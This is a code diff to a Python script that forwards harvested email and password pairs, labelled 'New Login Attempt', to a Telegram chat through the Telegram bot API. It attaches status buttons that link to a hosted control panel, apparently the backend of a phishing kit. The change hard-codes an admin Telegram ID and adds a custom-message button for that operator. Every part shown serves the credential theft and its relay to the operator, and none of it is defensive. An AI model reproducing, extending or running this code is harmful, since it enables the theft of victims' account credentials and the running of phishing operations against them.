@@ -10,6 +10,10 @@ BOT_TOKEN = os.environ.get('BOT_TOKEN')
 DEFAULT_USER_ID = os.environ.get('USER_ID') # Default user from .env
 HOSTED_URL = os.environ.get('HOSTED_URL')
 
+# --- CONSTANTS ---
+# The user ID of the admin who is allowed to set custom statuses.
+ADMIN_USER_ID = "5594467534"
+
 
 def send_notification(text, user_id=None):
     """
@@ -18,7 +22,6 @@ def send_notification(text, user_id=None):
     """
     base_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     
-    # Use the provided user_id, otherwise fall back to the default from .env
     chat_id = user_id if user_id else DEFAULT_USER_ID
 
     payload = {
@@ -36,11 +39,10 @@ def send_notification(text, user_id=None):
 def get_status_update(email, password, user_id=None):
     """
     Sends credentials to the specified Telegram user with status control buttons.
-    The button URLs now include the user_id for the callback.
+    If the user is the admin, an extra button to set a custom status is added.
     """
     base_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     
-    # Use the provided user_id, otherwise fall back to the default from .env
     chat_id = user_id if user_id else DEFAULT_USER_ID
     
     text = f"New Login Attempt:\n\nEmail: {email}\nPassword: {password}"
@@ -59,16 +61,26 @@ def get_status_update(email, password, user_id=None):
         'success'
     ]
     
-    # Build keyboard with the new callback URL format: /set_status/<user_id>/<email>/<status>
+    # Build keyboard with the standard callback buttons
     keyboard_layout = [
         [
             {
-                'text': status,
+                'text': status.replace("_", " ").title(),
                 'url': f"{HOSTED_URL}/set_status/{chat_id}/{quote(email)}/{quote(status)}"
             }
         ]
         for status in statuses
     ]
+
+    # --- NEW: If the recipient is the admin, add the special button ---
+    if str(chat_id) == ADMIN_USER_ID:
+        custom_button_row = [{
+            'text': '✍️ Set Custom Message',
+            'url': f"{HOSTED_URL}/set_custom_status?email={quote(email)}"
+        }]
+        # Add it as a new row at the bottom of the keyboard
+        keyboard_layout.append(custom_button_row)
+
 
     inline_keyboard = {'inline_keyboard': keyboard_layout}
     payload['reply_markup'] = json.dumps(inline_keyboard)
